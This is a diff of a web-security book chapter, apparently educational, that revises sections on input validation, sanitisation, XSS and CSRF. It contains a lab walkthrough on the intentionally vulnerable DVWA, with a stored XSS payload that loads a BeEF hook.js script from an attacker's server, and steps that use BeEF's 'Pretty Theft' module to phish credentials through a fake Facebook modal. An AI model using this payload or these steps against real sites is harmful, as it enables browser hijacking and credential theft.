@@ -85,8 +85,6 @@ Below are a few widely accepted techniques which we should use on any untrusted 
 
 ##### What is Validation {#web-applications-identify-risks-lack-of-input-validation-filtering-and-sanitisation-generic-what-is-validation}
 
-&nbsp;
-
 Decide what input is valid by way of a white list (list of allowed input characters). Often each input field will have a different white list. Validation is binary, the data is either allowed or denied. If it is not allowed, then it is rejected. It is usually not too complicated differentiating good from bad, and what is and isn't rejected. There are a few strategies to use for white listing, such as the collection of characters, or using regular expressions.
 
 There are other criteria that you can validate against as well, such as:
@@ -116,53 +114,49 @@ There are other criteria that you can validate against as well, such as:
 
 ##### What is Filtering {#web-applications-identify-risks-lack-of-input-validation-filtering-and-sanitisation-generic-what-is-filtering}
 
-&nbsp;
-
-When some of the data can pass through (be received) or is captured by the filter element (thou shalt not pass). OWASP has the RSnake donated seminal [XSS cheat sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet) which has many tests on it that you can use to check your vulnerability stance to XSS exploitation. This is highly recommended.
+Filtering represents when data can pass through (be received) or is captured by the filter element (thou shalt not pass). OWASP has the RSnake donated seminal [XSS cheat sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet) which has many tests on it that you can use to check your vulnerability to XSS exploitation. This is highly recommended.
 
 ##### What is Sanitisation {#web-applications-identify-risks-lack-of-input-validation-filtering-and-sanitisation-generic-what-is-sanitisation}
 
-&nbsp;
+Sanitisation is where input data (whether it is in your white list or not) is accepted and transformed into a medium that is no longer dangerous. This commonly goes through validation first. Sanitise character signatures (may be more than single characters, character combinations) not in your white list as a defence in depth strategy. The white list may change in the future due to a change in business requirements, and the developer may forget to revise the sanitisation routines. Think of security measures as standing on their own when you create them, but standing alongside, and often depending, on many other security measures once completed.
 
-Sanitisation of input data is where the input data (whether it is in your white list or not) is accepted and transformed into a medium that is no longer dangerous. This will probably go through validation first. The reason you sanitise character signatures (may be more than single characters, character combinations) not in your white list is a defence in depth strategy. The white list may change in the future due to a change in business requirements and the developer may forget to revise the sanitisation routines. Always think of any security measure as standing on its own when you create it, but standing alongside many other security measures once done.
-
-You need to know which contexts your input data will pass through in order to sanitise correctly for all potential execution contexts. This requires lateral thinking and following all execution paths. Both into and out of your application (once rehydrated), being pushed back to the client. We cover this in depth below in the ["Example in JavaScript and C#"](#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-generic-example-in-javascript-and-csharp) section in the countermeasures.
+Know which contexts your input data will pass through in order to sanitise correctly for all potential execution contexts. This requires lateral thinking, and following all execution paths, including both input and output application paths (once rehydrated) as data is pushed back to the client. We cover this in depth below in the ["Example in JavaScript and C#"](#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-generic-example-in-javascript-and-csharp) section in the countermeasures.
 
 #### Cross-Site Scripting (XSS) {#web-applications-identify-risks-cross-site-scripting}
 
-The following hands on hack demonstrates what a XSS attack is and provides a little insight into some of the damages that it can cause.
+The following hands-on demonstration of a cross-site scripting (XSS) attack provides insight into the damage it can cause.
 
-A XSS attack is one in which untrusted data enters a web application usually through a web request and is not stopped by validation, filtering or sanitisation. The data is then at some point sent to someone using the same web application without being validated, filtered or sanitised.  
-The data in question is executed by the browser, usually JavaScript, HTML or Flash. What the code does is up to the creativity of the initiator.
+A XSS attack is one in which untrusted data enters a web application, usually through a web request, and is allowed to execute without validation, filtering, or sanitisation. Data is then, at some point, sent to someone else (the adversary) using the same web application without being validated, filtered or sanitised.  
+The input data in question, usually JavaScript, HTML or Flash, is executed by the browser. What the code does is up to the creativity of the initiator.
 
-One way this can be carried out trivially is to simply buy an add and have that injected into the end users browser. The malicious code can be easily hidden by simply changing additional scripts that are fetched once live. Even fetching a script that fetches a different script under the attackers control.
+This can be carried out trivially when buying advertisements that inject malicious code via the end user's browser session. Malicious code can be easily hidden in the manner by simply changing additional scripts that are fetched, once live, even going so far as to fetch a script that fetches yet another script under the attacker's control.
 
-The two main different types of XSS are Stored/Persistent or Type I and Reflected/Non-Persistent or Type II.  
-Stored attacks are where the injected code is sent to the server and stored in a medium that the web application uses to retrieve it again to send to another user.  
-Reflected attacks use the web application in question as a proxy. When the user makes a request, the injected code travels from another medium through the web application (hence the reflecting) to the end user. From the browsers perspective, the injected code came from the web application the user made a request to.
+The two common types of XSS are Stored/Persistent (Type I) and Reflected/Non-Persistent (Type II).  
+Stored attacks are injected code sent to the server and stored in a medium that the web application uses to retrieve it again to send to another user.  
+Reflected attacks use the web application in question as a proxy. When the user makes a request, the injected code travels from another medium through the web application (hence reflection) to the end user. From the browser's perspective, the injected code came from the web application the user made a request to.
 
 {#wdcnz-demo-1}
 ![](images/HandsOnHack.png)
 
-The following attack was the first one of five that I demonstrated at WDCNZ in 2015. The attack after this one was a credential harvest based on a spoofed website that hypothetically was fetched due to a spear phishing attack. That particular attack can be found in the "Spear Phishing" section of the People chapter in [Fascicle 0](https://f0.holisticinfosecforwebdevelopers.com).
+The following attack was the first one of five that I demonstrated at WDCNZ in 2015. The subsequent attack was a credential harvest based on a spoofed website that was hypothetically fetched via a spear phishing attack. That particular attack can be found in the "Spear Phishing" section of the People chapter in [Fascicle 0](https://f0.holisticinfosecforwebdevelopers.com).
 
-Theoretically in order to get to the point where you carry out this attack, you would have already been through several stages first. If you are carrying out a penetration testing engagement, it is likely you would have been through the following:
+Theoretically, in order to achieve readiness for this attack, you would have executed several stages first. If you are carrying out a penetration testing engagement, it is likely you would have completed the following:
 
 1. Information gathering (probably partly even before you signed the contract with your client)
 2. Vulnerability scanning
 3. Vulnerability searching
 
-If you are working within a development team you may have found out some other way that your project was vulnerable to XSS.
+If you are working within a development team, you may have found other ways that your project was vulnerable to XSS.
 
-How ever you got to this point, you are going to want to exhibit the fault. One of the most effective ways to do this, is by using BeEF. BeEF clearly shows what is possible when you have an XSS vulnerability in scope and is an excellent tool for effortlessly demonstrating the severity of the fault to all of your team members and stakeholders.  
-One of BeEFs primary reasons to exist is to exploit the fact that many security philosophies seem to forget, is how easy it is to go straight through hardened network perimeters and attack the soft mushy insides of a sub network, as discussed in the Fortress Mentality section of the Physical chapter in [Fascicle 0](https://f0.holisticinfosecforwebdevelopers.com). Exposing XSS faults is one of BeEFs attributes. 
+Regardless, you are going to want to exhibit the fault. One of the most effective ways to do this, is by using BeEF. BeEF clearly shows what is possible when you have an XSS vulnerability in scope, and is an excellent tool for effortlessly demonstrating the severity of the fault to all of your team members and stakeholders.  
+One of BeEF's primary reasons for existence is to exploit the fact that many security philosophies seem to forget: how easy it is to go straight through hardened network perimeters, and attack the soft insides of a sub network, as discussed in the Fortress Mentality section of the Physical chapter in [Fascicle 0](https://f0.holisticinfosecforwebdevelopers.com). Exposing XSS faults is one of BeEFs attributes. 
 
 You can find the video of how this attack is played out at [http://youtu.be/92AWyUfJDUw](http://youtu.be/92AWyUfJDUw).
 
 I> ## Synopsis
 I>
-I> In this exercise, I used the Dam Vulnerable Web App (DVWA), as it has the types of XSS vulnerabilities we need in order to demonstrate the power of BeEF. DVWA is included in the OWASP Broken Web Application ([OWASPBWA](https://www.owasp.org/index.php/OWASP_Vulnerable_Web_Applications_Directory_Project)) turn-key VM, along with many other useful purposely vulnerable projects.  
-I> We use BeEF to exploit an XSS vulnerability in DVWA and carry out a simple attack in which we coerce the target to enter their credentials for a website and send them to our BeEF communications server unknowingly.
+I> In this exercise, I used the Damn Vulnerable Web App (DVWA) as it intentionally exposes the types of XSS vulnerabilities we need in order to demonstrate the power of BeEF. DVWA is included in the OWASP Broken Web Application ([OWASPBWA](https://www.owasp.org/index.php/OWASP_Vulnerable_Web_Applications_Directory_Project)) turn-key VM, along with many other useful purposely vulnerable projects.  
+I> We use BeEF to exploit an XSS vulnerability in DVWA and carry out a simple attack in which we coerce the target to enter their credentials for a website, and send them to our BeEF communications server unknowingly.
 
 {icon=bomb}
 G> ## The Play
@@ -177,44 +171,44 @@ G> Open another browser tab and log-in to the DVWA.
 G>
 G> Browse to "XSS stored".
 G>
-G> Enter some text in the Name field and some text in the Message field.
+G> Enter some text in the Name and Message fields.
 G> 
-G> Enable foxy proxy so that your request goes to the same port that burp suite is going to be listening on.
+G> Enable Foxy Proxy so that your request goes to the same port that Burp Suite is going to be listening on.
 G>
-G> Fire up burp.
+G> Initialise Burp.
 G>
-G> Back in the DVWA send your request by clicking on the Sign Guest-book button.
+G> Back in DVWA, send your request by clicking on the Sign Guest-book button.
 G>
-G> Switch back to burp -> Proxy tab and the request should be waiting for you. You now need to replace the text you used in the Message field `mtxMessage` with `<script src="http://<BeEF comms server IP address>:3000/hook.js"></script>` and forward the request.
+G> Switch back to the Burp -> Proxy tab and the request should be waiting for you. You now need to replace the text you used in the Message field `mtxMessage` with `<script src="http://<BeEF comms server IP address>:3000/hook.js"></script>` and forward the request.
 G>
-G> You can disable FoxyProxy now too.
+G> You can now disable FoxyProxy too.
 G>
-G> Now on your victims machine, the victim can log into DVWA and browse to the same "XSS stored" page. Now as the attacker, you will now notice that the BeEF Web UI shows a node with the victims IP address. This means BeEF has the victims browser hooked. The victims browser is now a zombie, continuously polling the BeEF communications server for commands to execute on its behalf.
+G> Now on your victim's system, the victim can log into DVWA and browse to the same "XSS stored" page. Now as the attacker, you will notice that the BeEF Web UI shows a node with the victims IP address. This means BeEF has the victims browser hooked. The victim's browser is now a zombie, continuously polling the BeEF communications server for commands to execute on its behalf.
 G>
-G> If you open the victims browser developer tools, you will be able to inspect the communications and the JavaScript within the hook.js file.
+G> If you open the victim's browser developer tools, you will be able to inspect the communications and the JavaScript within the hook.js file.
 G>
-G> Back in the BeEF web UI you can explore the modules that you can launch against the victims browser. You can view the types of attacks you can carry out on the [BeEF projects wiki](https://github.com/beefproject/beef/wiki/BeEF-modules).
+G> In the BeEF web UI you can explore the modules that you can launch against the victim's browser. You can review the types of attacks you can carry out on the [BeEF projects wiki](https://github.com/beefproject/beef/wiki/BeEF-modules).
 G>
-G> If you select the victims node and click on the Commands tab in the BeEF web UI, then in the Module Tree under Social Engineering select the "Pretty Theft" node. There are some options to configure, but even selecting the default of Facebook if you know your target is already an avid FB user should work fine. You would of course know this if you have done due diligence in the reconnaissance stage.
+G> Select the victim's node and click on the Commands tab in the BeEF web UI, then in the Module Tree under Social Engineering select the "Pretty Theft" node. There are some options to configure, but even just selecting the Facebook default, if you know your target is already an avid FB user, should work fine. You would, of course, know this if you have done due diligence in the reconnaissance stage.
 
 {icon=bomb}
-G> Click on the Execute button and on the next request -> response from the hook.js, the victims browser should pop a "Facebook Session Timed Out" modal. To get rid of this modal, the victim must enter their credentials and Log-in. There is no cancel or 'x' button. Once the victim has sent their credentials, they will be visible in the Command results of the BeEF web UI.  
+G> Click on the Execute button and on the next Request -> Response from the hook.js, the victim's browser should pop a "Facebook Session Timed Out" modal. To get rid of this modal, the victim must enter their credentials and log in. There is no cancel or 'x' button. Once the victim has sent their credentials, they will be visible in the Command results of the BeEF web UI.  
 
 ### [Cross-Site Request Forgery (CSRF)](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet#General_Recommendation:_Synchronizer_Token_Pattern) {#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-csrf}
 ![](images/ThreatTags/average-uncommon-easy-moderate.png)
 
-This type of attack depends on a fraudulent web resource; it could be a website, email, instant message, or program that causes the targets web browser to perform an unintentional action on a website that the target is currently authenticated with.
+This type of attack depends on a fraudulent web resource; it could be a website, email, instant message, or program that causes the target's web browser to perform an unintentional action on a website that the target is currently authenticated with.
 
-CSRF attacks target functionality that change state on the server (`POST`, `PUT`, `DELETE`) that the target is currently authenticated with. Such as requests like changing the targets credentials, making a purchase, moving money at their bank, forcing the target to retrieve data does not help the attacker.
+CSRF attacks target functionality that change state on the server (`POST`, `PUT`, `DELETE`) that the target is currently authenticated to. This includes requests such as changing the target's credentials, making a purchase, moving money at their bank, etc. Forcing the target to retrieve data does not typically help the attacker in this scenario.
 
-If you are using cookies (authentication that the browser automatically sends from the client) for storage of client-side session artefacts, CSRF is your main concern, but XSS is also a possible attack vector. 
+If you are using cookies (authentication that the browser automatically sends from the client) for storage of client-side session artifacts, CSRF is your main concern, but XSS is also a possible attack vector. 
 
-The target needs to submit the request either intentionally or unintentionally. The request could appear to the target as any action. For example:
+The target needs to submit the request, either intentionally or unintentionally. The request could appear to the target as any action. For example:
 
-1. Intentionally by clicking a button on a website that does not appear to have anything in common with the website that the target is already authenticated with by way of session Id stored in a cookie
-2. Unintentionally by loading a page not appearing to have anything in common with the website that the target is already authenticated with by way of session Id stored in a cookie, that for example contains an `<iframe>` with a form and a script block inside
+1. Intentionally, by clicking a button on a website that does not appear to have anything in common with the website that the target is already authenticated with by way of Session Id stored in a cookie
+2. Unintentionally, by loading a page not appearing to have anything in common with the website that the target is already authenticated with by way of Session Id stored in a cookie, that, for example, contains an `<iframe>` with a form and a script block inside
  
-**For No. 1 above**, the action attribute of the form for which the target submits could be to the website that the target is already authenticated with, thus a fraudulent request is issued from a web page seemingly unrelated to the website that the target is already authenticated with. This can be seen in the second example below on line 4. The browser plays its part and sends the session Id stored in the cookie. NodeGoat has an excellent example of how this plays out:
+**For No. 1 above**, the action attribute of the form the target submits could be to the website that the target is already authenticated with, thus a fraudulent request is issued from a web page seemingly unrelated to the website that the target is already authenticated with. This can be seen in the second example below on line 4. The browser plays its part and sends the session Id stored in the cookie. NodeGoat has an excellent example attack step by step:
 
 Below code can be found at [https://github.com/OWASP/NodeGoat/](https://github.com/OWASP/NodeGoat/blob/b475010f2de3d601eda3ad2498d9e6c729204a09/app/views/profile.html):
 
